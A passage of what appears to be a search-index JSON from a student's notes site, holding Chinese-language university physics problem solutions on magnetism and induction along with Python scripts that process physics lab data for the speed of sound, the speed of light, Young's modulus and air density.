l\uff0c\u8f7d\u6d41\u5bfc\u7ebf\u4f4d\u4e8e\u4e0e\u5300\u5f3a\u78c1\u573a\u5782\u76f4\u7684\u5e73\u9762\u5185\uff0c\u6c42\u4f5c\u7528\u5728\u5bfc\u7ebf\u4e0a\u7684\u5b89\u57f9\u529b\u3002</p> <p></p> <p>\u6839\u636e\u9ad8\u4e2d\u77e5\u8bc6\u5176\u5b9e\u90fd\u77e5\u9053\u6240\u6240\u53d7\u529b\u7b49\u4ef7\u4e8e\u7535\u6d41\u8d77\u70b9\u548c\u7ec8\u70b9\u4e4b\u95f4\u8fde\u7ebf\u4ee3\u8868\u7535\u7ebf\u6240\u53d7\u5230\u7684\u529b\u3002\\(\\overrightarrow{F}=2(l+R)IB \\hat{y}\\)</p> <p></p>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#ii4","title":"II.4 \u6c42\u78c1\u77e9","text":"<p>Question</p> <p>\u4ece\u7ecf\u5178\u89c2\u70b9\u770b\uff0c\u6c22\u539f\u5b50\u53ef\u770b\u4f5c\u662f\u4e00\u4e2a\u7535\u5b50\u7ed5\u6838\u4f5c\u9ad8\u901f\u65cb\u8f6c\u7684\u4f53\u7cfb\uff0c\u5df2\u77e5\u7535\u5b50\u548c\u8d28\u5b50\u7684\u7535\u8377\u5206\u522b\u4e3a -e \u548c e \uff0c\u7535\u5b50\u8d28\u91cf\u4e3a \\(m_e\\) \uff0c\u6c22\u539f\u5b50\u7684\u5706\u8f68\u9053\u534a\u5f84\u4e3a r \uff0c\u7535\u5b50\u4f5c\u5e73\u9762\u8f68\u9053\u8fd0\u52a8\uff0c\u5219\u7535\u5b50\u8f68\u9053\u8fd0\u52a8\u7684\u78c1\u77e9\u4e3a</p> <p>\u7531\u5e93\u4ed1\u529b\u63d0\u4f9b\u5411\u5fc3\u529b\uff1a \\(\\frac{e^2}{4\\pi\\varepsilon_0r^2}=m_e\\frac{v^2}{r}\\Rightarrow v=\\frac{e}{\\sqrt{4\\pi m_e\\varepsilon_0r}}\\)</p> <p>\u6545\u6709\uff1a \\(I = \\frac{ev}{2\\pi r}\\)</p> <p>\\(p_\\text{m}=IS=e\\frac{\\upsilon}{2\\pi r}\\pi r^2=\\boxed{\\frac{evr}{2}} = \\frac{e^2}{4}\\sqrt{\\frac{r}{\\pi\\varepsilon_0m_e}}\\)</p>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#ii5","title":"II.5 \u6c42\u78c1\u529b\u77e9","text":"<p>Note</p> <p> <p></p> <p></p> </p> <p>Question</p> <p>\uff08\u767e\u5ea6\u6587\u5e93\uff09\u5982\u56fe\u6240\u793a\uff0c\u4e24\u6839\u76f8\u4e92\u7edd\u7f18\u7684\u65e0\u9650\u76f4\u5bfc\u7ebf 1 \u548c 2 \u7ede\u63a5\u4e8e O \u70b9\uff0c\u4e24\u5bfc\u7ebf\u95f4\u5939\u89d2\u4e3a\u03b8\uff0c\u901a\u6709\u76f8\u540c\u7684\u7535\u6d41 I\uff0c\u8bd5\u6c42\u5355\u4f4d\u957f\u5ea6\u5bfc\u7ebf\u6240\u53d7\u78c1\u529b\u5bf9 O \u70b9\u7684\u529b\u77e9\u3002</p> <p><p></p></p> <p>Question</p> <p></p> <p>Tip</p> <p>\u5747\u5300\u8f7d\u6d41\u65e0\u9650\u5927\u5e73\u677f\u5728\u53f3\u4fa7\u9644\u8fd1\u4ea7\u751f\u7684\u78c1\u611f\u5e94\u5f3a\u5ea6\u4e3a \\(\\frac{\\mu_{0}j}{2}\\) \uff0c\u65b9\u5411\u5782\u76f4\u7eb8\u9762\u5411\u91cc\uff1b\u56e0\u4e3a\u662f\u5747\u5300\u78c1\u573a\uff0c\u6240\u4ee5\u53ef\u7528\u78c1\u77e9\u8ba1\u7b97\u78c1\u529b\u77e9\u3002</p> <p>\u2235 \u78c1\u77e9\u4e0e\u7ebf\u5708\u5e73\u9762\u5782\u76f4  \u2234  1. \u7ebf\u5708\u5e73\u9762\u4e0e\u8f7d\u6d41\u5927\u5e73\u9762\u5782\u76f4\u65f6\uff0c\u78c1\u77e9\u5e73\u884c\u4e8e B \uff0c\u56e0\u6b64\u78c1\u529b\u77e9\u4e3a 0 \uff1b</p> <ol> <li>\u7ebf\u5708\u5e73\u884c\u4e8e\u8f7d\u6d41\u5927\u5e73\u9762\u65f6\uff0c\u78c1\u77e9\u5782\u76f4\u4e8e B \uff0c\u56e0\u6b64 \\(M=p_\\text{m}B\\sin90^\\circ=\\frac{\\mu_0\\pi R^2Ij}4\\)</li> </ol>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#ii6","title":"II.6 \u6c42\u78c1\u573a\u529b\u505a\u529f","text":"<p>Note</p> <p> <p></p> <p></p> <p></p> </p> <p></p>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#ii7","title":"II.7 \u6d1b\u4f26\u5179\u529b\u53ca\u5176\u5e94\u7528","text":"<p>Note</p> <p><p></p></p>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#ii8","title":"II.8 \u970d\u5c14\u6548\u5e94","text":"","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#iii-16","title":"III \u7b2c 16 \u7ae0\uff1a\u7269\u8d28\u4e2d\u7684\u78c1\u573a","text":"","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#iii1","title":"III.1 \u78c1\u4ecb\u8d28\u7684\u5206\u7c7b","text":"<p>\u4ecb\u8d28\u5728\u78c1\u573a\u4e2d\u88ab\u78c1\u5316\uff0c\u4ecb\u8d28\u5185\u7684\u78c1\u611f\u5e94\u5f3a\u5ea6 \ud835\udc69 \u4e3a\uff1a\u771f\u7a7a\u4e2d\u539f\u6765\u7684\u78c1\u611f\u5e94\u5f3a\u5ea6 \\(\ud835\udc69_\ud835\udfce\\) \u548c\u9644\u52a0\u78c1\u611f\u5e94\u5f3a \ud835\udc69'\u4e4b\u548c\u3002 \\(B = B_0 + B'\\) \uff0c\\(\\text{\u987a\u78c1\u8d28 }B&gt;B_0\\text{\u3001\u6297\u78c1\u8d28}B&lt;B_0\\text{\u3001\u94c1\u78c1\u8d28 }B&gt;&gt;B_0\\) \u3002</p> <p></p>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#iii2","title":"III.2 \u987a\u78c1\u8d28\u548c\u6297\u78c1\u8d28\u7684\u78c1\u5316","text":"<p>\u5706\u7535\u6d41\u53ef\u4ee5\u770b\u4f5c\u662f\u4e00\u4e2a\u5c0f\u7684\u8f7d\u6d41\u7ebf\u5708\uff0c\u5f53\u6dfb\u52a0\u4e00\u4e2a\u5916\u90e8\u78c1\u573a\u65f6\uff0c\u6240\u6709\u8f7d\u6d41\u7ebf\u5708\u7684\u65b9\u5411\u8d8b\u8fd1\u4e00\u81f4\u3002</p> <p>\u603b\u800c\u8a00\u4e4b\uff0c\u987a\u78c1\u6027\u662f\u56e0\u4e3a\u5206\u5b50\u78c1\u77e9\u503e\u5411\u4e8e\u5f80\u5916\u52a0\u78c1\u573a\u65b9\u5411\u6392\u5217\uff1b\u6297\u78c1\u6027\u6765\u6e90\u4e8e\u603b\u78c1\u77e9\u4e3a 0 \u65f6\uff0c\u5206\u5b50\u8fdb\u52a8\u3002</p>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#iii3","title":"III.3 \u78c1\u5316\uff08\u675f\u7f1a\uff09\u7535\u6d41\u548c\u78c1\u5316\u5f3a\u5ea6","text":"<p>Note</p> <p></p>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#iii4","title":"III.4 \u78c1\u4ecb\u8d28\u4e0b\u6c42\u78c1\u573a","text":"<p>Question</p> <p></p> <p></p>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#iv-17","title":"IV \u7b2c 17 \u7ae0\uff1a\u7535\u78c1\u611f\u5e94","text":"","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#_1","title":"\u5bc6\u7ed5\u87ba\u7ebf\u7ba1","text":"<p>\\(B = \\frac{\\mu_{0}NI}{l}, \\Phi = BS = \\frac{\\mu_{0}NI\\pi R^2}{l}, \\Psi=N\\Phi=\\frac{\\mu_{0}N^2I\\pi R^2}{l}\\) </p> <p>\\(\\varepsilon_{L} = -\\frac{\\mu_{0}\\pi N^2R^2}{l} \\frac{dI}{dt}, L = - \\frac{d\\Psi}{dt} = -L \\frac{dI}{dt}\\)</p>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#_2","title":"\u6c42\u7535\u52a8\u52bf","text":"","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#_3","title":"\u5b9a\u4e49\u6cd5","text":"<p>Question</p> <p></p> \\[ \\begin{align} &amp;\\mathrm{d}\\varepsilon_i=vB\\sin\\alpha\\frac{\\mathrm{d}x}{\\cos\\alpha}=\\frac{v\\mu_0I}{2\\pi x}\\tan\\alpha\\:\\mathrm{d}x \\\\ &amp;\\implies \\varepsilon_{i}=\\int_{a}^{a+l\\cos\\alpha}\\frac{\\upsilon\\mu_{0}I}{2\\pi x}\\tan\\alpha\\mathrm{d}x=\\frac{v\\mu_{0}I}{2\\pi}\\tan\\alpha\\ln\\frac{a+l\\cos\\alpha}{a} \\end{align} \\] <p>\u7531 b \u6307\u5411 c</p>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#_4","title":"\u78c1\u901a\u91cf\u6cd5","text":"<p>Question</p> <p></p> <p>\u5982\u56fe\uff0c\u7531\u4e8e OAB \u95ed\u5408\u56de\u8def\u7684\u78c1\u901a\u91cf\u59cb\u7ec8\u4e3a 0\uff0c\u603b\u4f53\u7535\u52a8\u52bf\u4e3a 0\uff1b\u53c8 OA \u6bb5\u4e0d\u5207\u5272\u78c1\u611f\u7ebf\uff0c\u6240\u4ee5\u5728\u5927\u5c0f\u4e0a\uff0cAB \u548c OB \u6bb5\u7535\u52a8\u52bf\u76f8\u540c\uff0c\u65b9\u5411\u540c\u4e0a\u4e00\u9898\u4e00\u6837\u5224\u5b9a\u3002</p> <p>\u6700\u7ec8\u5f97\u5230\uff1a\\(\\varepsilon_{OB} = \\frac{1}{2}\\omega BL^2\\sin^2\\theta\\)</p> <p>\u5916\u88c5\u4ee3\u8111\u4e0a\u8fd8\u6709\u51e0\u9053\u96be\u9898\uff0c\u671f\u672b\u505a \u3002</p>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#_5","title":"\u6c42\u81ea\u611f\u7cfb\u6570","text":"<p>\u7535\u611f\u78c1\u80fd\uff1a\\(W_{m}=\\frac{1}{2} I\\Psi = \\frac{1}{2}LI^2\\)</p> <p>Question</p> <p>\u4e24\u6839\u534a\u5f84\u4e3a a \u7684\u5e73\u884c\u957f\u76f4\u4f20\u8f93\u7ebf\uff0c\u76f8\u8ddd\u4e3a d\uff0c\u4e14 \\(a\\ll d\\)\uff0c\u6c42\u5355\u4f4d\u957f\u5ea6\u4f20\u8f93\u7ebf\u7684\u81ea\u611f\u3002</p> <p>\u7ecf\u5178\u6a21\u578b\u4e86\uff0c\u6c42 B \u5206\u5e03 =&gt; \u78c1\u901a\u91cf =&gt; \u5168\u78c1\u901a =&gt; \u81ea\u611f\u7cfb\u6570\u3002</p> \\[ \\begin{align} &amp;B=\\frac{\\mu_0I}{2\\pi r}+\\frac{\\mu_0I}{2\\pi(d-r)} \\implies \\\\ &amp;\\frac{\\Phi}{l}=\\frac{\\int_a^{d-a}l{\\left[\\frac{\\mu_0I}{2\\pi r}+\\frac{\\mu_0I}{2\\pi(d-r)}\\right]}\\mathrm{d}r}{l}=\\frac{\\mu_0I}{\\pi}\\ln\\frac{d-a}{a} \\implies \\\\ &amp; L=\\frac{\\mu_0}{\\pi}\\ln\\frac{d-a}a \\end{align} \\]","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#_6","title":"\u6c42\u4e92\u611f\u7cfb\u6570","text":"<p>Question</p> <p></p> <p>\u540c\u6837\u662f\u6765\u81ea SAVIA \u7684\u6982\u5ff5\u548c\u4f8b\u9898\u3002</p>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#_7","title":"\u6c42\u4f4d\u79fb\u7535\u6d41","text":"<p>Question</p> <p></p> <p>\u9ea6\u514b\u65af\u97e6\u65b9\u7a0b\u7ec4\uff1a</p> <p></p>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#_8","title":"\u5149\u7684\u884d\u5c04","text":"<p>Question</p> <p>\u4ee5\u6bcf\u6beb\u7c73 500 \u6761\u6805\u7eb9\u7684\u884d\u5c04\u5149\u6805\u89c2\u5bdf\u94a0\u5149\u8c31\u7ebf\uff08\u03bb = 590nm \uff09\uff0c\u7f1d\u5bbda \u4e0e\u523b\u75d5\u5bbd\u5ea6 b \u4e4b\u6bd4\u4e3a 1\uff1a2\u3002\uff081\uff09\u5e73\u884c\u5149\u5782\u76f4\u5165\u5c04\u4e8e\u5149\u6805\u65f6\u80fd\u770b\u5230\u54ea\u4e9b\u5149\u8c31\u7ebf\uff1f\uff082\uff09\u5e73\u884c\u5149\u4ee5 30\u00b0\u659c\u5165\u5c04\u65f6\u53c8\u5982\u4f55\uff1f</p> <p></p> <ol> <li> <p>\u60f3\u60f3\u65e0\u4ecb\u8d28\u9ad8\u65af\u5b9a\u7406\u548c\u4ecb\u8d28\u5185\u7684\u9ad8\u65af\u5b9a\u7406\uff0c\u76f8\u51cf\u5373\u53ef\u3002\u00a0\u21a9</p> </li> </ol>","tags":["notes","physics"]},{"location":"note/physics/%E5%A4%A7%E7%89%A9%E5%AE%9E%E9%AA%8C%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC/","title":"\u5927\u7269\u5b9e\u9a8c\u6570\u636e\u5904\u7406\u811a\u672c","text":"<p>Summary</p> <p>\u672c\u4eba\u5927\u5b66\u7269\u7406\u5b9e\u9a8c\u5904\u7406\u6570\u636e\u7684\u811a\u672c\uff0c\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff08\u5c24\u5176\u662f\u6570\u636e\uff01\u4e0d\u8981\u6284\u88ad\uff01\uff09\uff0c\u5982\u51fa\u73b0\u9519\u8bef\u811a\u672c\u63d0\u4f9b\u8005\u4e0d\u627f\u62c5\u4efb\u4f55\u8d23\u4efb\uff0c\u4f7f\u7528\u65f6\u5e0c\u671b\u5927\u5bb6\u987a\u4fbf\u68c0\u67e5\u662f\u5426\u6709\u8bef\uff0c\u53ef\u5728\u8bc4\u8bba\u533a\u7559\u8a00\uff1b\u540c\u65f6\u6b22\u8fce\u7559\u8a00/\u79c1\u6233\u63d0\u4f9b\u81ea\u5df1\u7684\u811a\u672c\uff08\u5e0c\u671b\u6709\u4e00\u5b9a\u7684\u4e2d/\u82f1\u6587\u6ce8\u91ca\uff09\uff0c\u65b9\u5f0f\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u76f4\u63a5\u63d0\u4f9b\u811a\u672c/\u63d0\u4f9b\u5bf9\u5e94\u7684\u94fe\u63a5\u3002</p> <ul> <li>\u540c\u65f6\u53ef\u4ee5\u53c2\u8003\u666e\u901a\u7269\u7406\u5b66\u5b9e\u9a8c I</li> </ul> <p>Attention</p> <p>\u9274\u4e8e\u4e0d\u662f\u6240\u6709\u4eba\u90fd\u6709 python(3) \u8fd0\u884c\u73af\u5883\uff0c\u4ee5\u53ca\u6709\u65f6\u4ee3\u7801\u8fc7\u957f\u5f71\u54cd\u89c2\u611f\uff0c\u4ee3\u7801\u5c06\u653e\u5728\u6211\u7684 LeetCode/playground \u4e2d\uff0c\u5728\u90a3\u91cc\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u6570\u636e\u8fd0\u884c\uff0c\u6216\u8005\u662f fork \u5230\u4f60\u81ea\u5df1\u7684 playground \u4e2d\u3002\u5f53\u7136\uff0c\u7531\u4e8e\u662f\u5728\u7ebf\u73af\u5883\uff0c\u90e8\u5206\u9700\u8981\u5bfc\u5165\u7684\u6a21\u5757\u7f3a\u5931\uff0c\u53ef\u80fd\u5bfc\u81f4\u8fd0\u884c\u9519\u8bef\u3002</p> <p>\u6216\u8005\u770b github.com/darstib/physics_exp\uff0c\u6587\u4ef6\u540d\u7eaf\u673a\u7ffb\u3002</p>","tags":["notes","physics"]},{"location":"note/physics/%E5%A4%A7%E7%89%A9%E5%AE%9E%E9%AA%8C%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC/#_1","title":"\u58f0\u901f\u7684\u6d4b\u5b9a","text":"<p>LeetCode</p> measurementOfTheSpeedOfSound.py<pre><code># \u9a7b\u6ce2\u6cd5/\u76f8\u4f4d\u5dee\u6cd5 \u8bfb\u6570\nread1 = [11.335, 15.540, 19.805, 24.110, 28.550, 33.002, 37.625, 42.065]\nread2 = [38.805, 43.065, 47.390, 51.625, 56.000, 60.305, 64.655, 69.085]\n\n# \u9891\u7387\nf = 40.1\n# \u6e29\u5ea6\nt = 25.2\n# \u4e0d\u786e\u5b9a\u5ea6 ub\nub = 0.030\n\n# \u83b7\u5f97\u534a\u6ce2\u957f\ndef get_lambda_2(read):\n    l = len(read)\n    m = l // 2\n    # print(m)\n    sum1 = sum(read[:m])\n    sum2 = sum(read[m:])\n    # print(sum1, sum2)\n    return (sum2 - sum1) / (m**2)\n\n\n# \u83b7\u5f97\u6d4b\u91cf\u58f0\u901f\ndef get_v(read, f):\n    lambda_2 = get_lambda_2(read)\n    # print(lambda_2)\n    return 2 * lambda_2 * f\n\n# \u4e24\u79cd\u65b9\u6cd5\u7684\u58f0\u901f\nv1 = get_v(read1, f)\nv2 = get_v(read2, f)\n\nprint(\"\u6d4b\u5f97\u58f0\u901f\uff1a\", v1, v2)\n\nfrom math import sqrt\n\n# \u83b7\u5f97\u6e29\u5ea6\u4e3at\u65f6\u7684\u58f0\u901f\ndef get_v(t):\n    return 331.45 * sqrt(t / 273.15 + 1)\n\nvt = get_v(t)\n\n# \u6d4b\u91cf\u76f8\u5bf9\u8bef\u5dee\ndef get_err(v, vt):\n    return abs(v - vt) / vt\n\nprint(\"\u5b9e\u9645\u58f0\u901f\uff1a\", vt)\nerr1 = get_err(v1, vt)\nerr2 = get_err(v2, vt)\n\nprint(\"\u76f8\u5bf9\u8bef\u5dee\uff1a\", err1, err2)\n\n# \u8ba1\u7b97\u5e73\u5747\u503c\ndef get_overline(read):\n    return sum(read) / len(read)\n\n# \u8ba1\u7b97\u4e0d\u786e\u5b9a\u5ea6 ua\ndef get_ua(read):\n    read_overline = get_overline(read)\n    n = len(read)\n    return sqrt(sum([(x - read_overline) ** 2 for x in read]) / ((n - 1) * n))\n\n# print(\"\u6d4b\u5f97 U_a \uff1a\", get_ua(read1, read1_overline), get_ua(read2, read2_overline))\n\n# \u83b7\u5f97\u591a\u6b21\u6d4b\u91cf\u7684 lambda\ndef get_lams(read):\n    l = len(read)\n    m = l // 2\n    lams = []\n    for i in range(m):\n        lams.append((read[i + m] - read[i]) * 2)\n    return lams\n\n# A\u7c7b\u4e0d\u786e\u5b9a\u5ea6\nua1 = get_ua(get_lams(read1))\nua2 = get_ua(get_lams(read2))\n\nprint(\"\u6d4b\u5f97 U_a \uff1a\", ua1, ua2)\n\n\ndef get_u(ua, ub):\n    return sqrt(ua**2 + ub**2)\n\n\nu1 = get_u(ua1, ub)\nu2 = get_u(ua2, ub)\n\nprint(\"\u4e0d\u786e\u5b9a\u5ea6\uff1a\", u1, u2) \n</code></pre>","tags":["notes","physics"]},{"location":"note/physics/%E5%A4%A7%E7%89%A9%E5%AE%9E%E9%AA%8C%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC/#_2","title":"\u5149\u901f\u6d4b\u91cf","text":"<p>LeetCode</p> measurementOfTheSpeedOfLight.py<pre><code># \u6d4b\u91cf\u6570\u636e\uff08\u4f7f\u7528\u7a7a\u683c\u662f\u56e0\u4e3a\u6253\u5b57\u7a7a\u683c\u6bd4\u9017\u53f7\u65b9\u4fbf\uff09\n## \u7b2c\u4e00\u7ec4 \u65b9\u6ce2\u5f62 \ns1_1 = \"0.04 0.05 0.07 0.10 0.15 0.20\"\nS1_1 = [float(i) for i in s1_1.split()]\ns2_1 = \"0.44 0.45 0.37 0.50 0.45 0.40\"\nS2_1 = [float(i) for i in s2_1.split()]\ndt_1 = \"58.5 58.0 44.5 58.5 45.0 29.5\"\ndt_1s = [float(i) for i in dt_1.split()]\n## \u7b2c\u4e8c\u7ec4 \u6b63\u5f26\u6ce2\u5f62\ns1_1 = \"0.01 0.03 0.05 0.07 0.09 0.11\"\nS1_2 = [float(i) for i in s1_1.split()]\ns2_1 = \"0.51 0.43 0.45 0.47 0.49 0.51\"\nS2_2 = [float(i) for i in s2_1.split()]\ndt_2 = \"73.0 59.5 57.5 59.0 59.5 58.0\"\ndt_2s = [float(i) for i in dt_2.split()]\n\n# \u9891\u7387\nv = 1 * 10**8\nv_ = 4.55 * 10**5 # v_ \u76f8\u5f53\u4e8e v'\n\n\n# \u8ba1\u7b97\u5149\u901f\ndef get_cs(S1, S2, dt_s):\n    def get_c(ds, dt_):\n        return (2 * ds * v) / (dt_ * v_)\n\n    cs = []\n    for s1, s2, dt_ in zip(S1, S2, dt_s):\n        cs.append(get_c(s2 - s1, dt_))\n    return cs\n\n\ncs1 = get_cs(S1_1, S2_1, dt_1s)\ncs2 = get_cs(S1_2, S2_2, dt_2s)\nprint(\"\u7b2c\u4e00\u7ec4\uff1a\", cs1)\nprint(\"\u7b2c\u4e8c\u7ec4\uff1a\", cs2)\n\n# \u5e73\u5747\u5149\u901f\ndef get_avg(cs):\n    return sum(cs) / len(cs)\n\nc1_avg = get_avg(cs1)\nc2_avg = get_avg(cs2)\nprint(\"\u5e73\u5747\u5149\u901f\", c1_avg, c2_avg)\n\n# \u6d4b\u91cf\u76f8\u5bf9\u8bef\u5dee\ndef get_err(c_avg):\n    c = 3  # * 10**8\n    return abs(c - c_avg) / c\n\nerr1 = get_err(c1_avg)\nerr2 = get_err(c2_avg)\nprint(\"\u76f8\u5bf9\u8bef\u5dee\uff1a\", err1, err2)\n\n# \u8ba1\u7b97\u4e0d\u786e\u5b9a\u5ea6 ua\ndef get_ua(cs):\n    from math import sqrt\n\n    c_avg = get_avg(cs)\n    n = len(cs)\n    return sqrt(sum([(c - c_avg) ** 2 for c in cs]) / ((n - 1) * n))\n\nua1 = get_ua(cs1)\nua2 = get_ua(cs2)\nprint(\"\u6d4b\u5f97 U_a \uff1a\", ua1, ua2)\n\n# \u672c\u9898\u6211\u4eec\u8001\u5e08\u6ca1\u8bf4 u_b \u5728\u54ea\uff0c\u6211\u53c2\u8003\u7684\u62a5\u544a\u4e5f\u6ca1\u5199\uff0c\u6211\u4e5f\u5c31\u6ca1\u7b97\u4e86\u2026\u2026\n</code></pre>","tags":["notes","physics"]},{"location":"note/physics/%E5%A4%A7%E7%89%A9%E5%AE%9E%E9%AA%8C%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC/#_3","title":"\u91d1\u5c5e\u6750\u6599\u6768\u6c0f\u6a21\u91cf\u7684\u6d4b\u5b9a","text":"<p>\u6570\u636e\u5904\u7406\u90e8\u5206\u7406\u89e3\u6709\u95ee\u9898\uff0c\u4f46\u662f\u53ef\u80fd\u53ea\u662f hkk \u8001\u5e08\u8fd9\u6837\u8981\u6c42\uff1f\u5c31\u4e0d\u653e\u51fa\u6765\u4e86\u3002</p> <p>\u9e64\u7fd4\u4e07\u91cc\u7684\u5904\u7406\u4ee3\u7801</p>","tags":["notes","physics"]},{"location":"note/physics/%E5%A4%A7%E7%89%A9%E5%AE%9E%E9%AA%8C%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC/#_4","title":"\u52a8\u6001\u6cd5\u6d4b\u91cf\u7684\u6768\u6c0f\u6a21\u91cf","text":"<p>Leetcode</p> 4_youngSModulus2.py<pre><code># ZJU \u52a8\u6001\u6cd5\u6d4b\u91cf\u6750\u6599\u6768\u6c0f\u6a21\u91cf \u6570\u636e\u5904\u7406\u811a\u672c\n# \u5904\u7406 f\ndef get_f(fs):\n\n    import numpy as np\n    import matplotlib.pyplot as plt\n    from scipy.optimize import curve_fit\n\n    xs = [5 * i for i in range(1, 11) if i != 7]\n\n    # Define the quadratic function for fitting\n    def quadratic(x, a, b, c):\n        return a * x**2 + b * x + c\n\n    # Perform curve fitting\n    popt, _ = curve_fit(quadratic, xs, fs)\n    # Generate points for smooth curve\n    x_smooth = np.linspace(min(xs), max(xs), 100)\n    y_smooth = quadratic(x_smooth, *popt)\n    # Find the minimum point\n    x_min = -popt[1] / (2 * popt[0])\n    y_min = quadratic(x_min, *popt)\n    # Plotting\n    plt.figure(figsize=(10, 6))\n    plt.scatter(xs, fs, color=\"red\", label=\"Data points\")\n    plt.plot(x_smooth, y_smooth, color=\"blue\", label=\"Fitted curve\")\n    plt.plot(x_min, y_min, \"go\", label=\"Minimum point\")\n    plt.xlabel(\"x (mm)\")\n    plt.ylabel(\"Frequency (Hz)\")\n    plt.title(\"Frequency vs Distance\")\n    plt.legend()\n    plt.grid(True)\n    # Annotate the minimum point\n    plt.annotate(\n        f\"Min: ({x_min:.2f}, {y_min:.2f})\",\n        xy=(x_min, y_min),\n        xytext=(5, 5),\n        textcoords=\"offset points\",\n    )\n    plt.savefig(\"4_youngSModulus2.png\")\n    print(f\"Minimum point: x = {x_min:.2f}, f = {y_min:.2f}\")\n    return y_min\n\n\nfs = [736.4, 734.8, 733.8, 733.1, 732.5, 731.8, 732.2, 732.3, 732.5]\n# f_fix = get_f(fs)\nf_fix = 731.86\n\n##### \u5904\u7406\u8bfb\u6570 #####\nd0 = -0.015  # \u87ba\u65cb\u6d4b\u5fae\u5668\u96f6\u70b9\u8bfb\u6570 \u5355\u4f4d: mm\nds = [5.950, 5.945, 5.948, 5.955, 5.952]  # \u5355\u4f4d: mm\nLs = [160.5, 160.1, 160.2, 160.1, 160.1]  # \u5355\u4f4d: mm\nms = [37.338, 37.337, 37.336, 37.337, 37.337]  # \u5355\u4f4d: g\uff0c\u53ef\u4ee5\u53ea\u6d4b\u4e00\u6b21\uff0c\u81ea\u5df1\u8bbe\u7f6e m_avg\n\nfrom math import sqrt\n\n\ndef get_avg(li):\n    return sum(li) / len(li)\n\n\nd_avg = get_avg(ds) - d0\nL_avg = get_avg(Ls)\nm_avg = get_avg(ms)\nprint(\"d_avg:\", d_avg, \"L_avg:\", L_avg, \"m_avg:\", m_avg)\n\n\n# dl \u4e3a\u4eea\u5668\u8bef\u5dee\ndef get_U(li, dl):\n    # get U_a\n    n = len(li)\n    i_avg = get_avg(li)\n    U_a = sqrt(sum([(i - i_avg) ** 2 for i in li]) / (n * (n - 1)))\n    U_b = dl / sqrt(3)\n    U = sqrt(U_a**2 + U_b**2)\n    return U_a, U_b, U\n\n\n# L \u4e0d\u786e\u5b9a\u5ea6\ndL = 0.2\ndd = 0.004\ndm = 0.001\ndf = 0.1\nL_a, L_b, U_L = get_U(Ls, dL)\nprint(\"L_a:\", L_a, \"L_b:\", L_b, \"U_L:\", U_L)\n# d \u4e0d\u786e\u5b9a\u5ea6\nd_a, d_b, U_d = get_U(ds, dd)\nprint(\"d_a:\", d_a, \"d_b:\", d_b, \"U_d:\", U_d)\n\nE = [\n    1.6067 * (L**3) * m * (f_fix**2) / (d**4) / (1e11) for L, m, d in zip(Ls, ms, ds)\n]  # \u5355\u4f4d: 10**11 N/m^2\n\nE_avg = get_avg(E)\nprint(\"E_avg: \", E_avg)\n\nE = 1.6067 * (L_avg**3) * m_avg * (f_fix**2) / (d_avg**4) / (1e11)\nprint(\"E:\", E)\n# \u8ba1\u7b97\u76f8\u5bf9\u4e0d\u786e\u5b9a\u5ea6\ndE = E_avg * sqrt(\n    (\n        (3 * dL / L_avg) ** 2\n        + (4 * dd / d_avg) ** 2\n        + (dm / m_avg) ** 2\n        + (2 * df / f_fix) ** 2\n    )\n)\n\nprint(\"dE:\", dE)\n</code></pre>","tags":["notes","physics"]},{"location":"note/physics/%E5%A4%A7%E7%89%A9%E5%AE%9E%E9%AA%8C%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC/#matlab","title":"\u666e\u6717\u514b\u5e38\u91cf\uff08Matlab\uff09","text":"<p>phylab-plangke \u6765\u81ea @\u5409\u6c34\u98de\u4e91</p>","tags":["notes","physics"]},{"location":"note/physics/%E5%A4%A7%E7%89%A9%E5%AE%9E%E9%AA%8C%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC/#_5","title":"\u7a7a\u6c14\u5bc6\u5ea6\u6d4b\u91cf","text":"<p>Leetcode</p> 5_measurementOfAirDensity<pre><code># ZJU \u7a7a\u6c14\u5bc6\u5ea6\u6d4b\u91cf \u6570\u636e\u5904\u7406\u811a\u672c\n# p \u53ef\u80fd\u662f \u201c\u6c14\u538b\u201d\uff0c\u4e5f\u53ef\u80fd\u662f \u201c\u5bc6\u5ea6\u201d\uff0c\u8bf7\u4f9d\u636e\u6ce8\u91ca\u533a\u5206\nt = 22.0  # \u2103\npw0 = 2643.38  # Pa \uff0c\u9971\u548c\u6c34\u84b8\u6c14\u538b\nn = 0.615  # \u76f8\u5bf9\u6e7f\u5ea6\npw = pw0 * n  # Pa \uff0c\u6c34\u84b8\u6c14\u538b\nprint(\"pw:\", pw)\n\nV = 159.326  # cm^3 \u73bb\u7483\u6ce1\u7684\u4f53\u79ef\ndms = [0.1893, 0.1892, 0.1891]  # g m1-m0 \u7a7a\u6c14\u8d28\u91cf\nps = [m / V for m in dms]  # g/cm^3 \u7a7a\u6c14\u5bc6\u5ea6\nprint(\"ps:\", 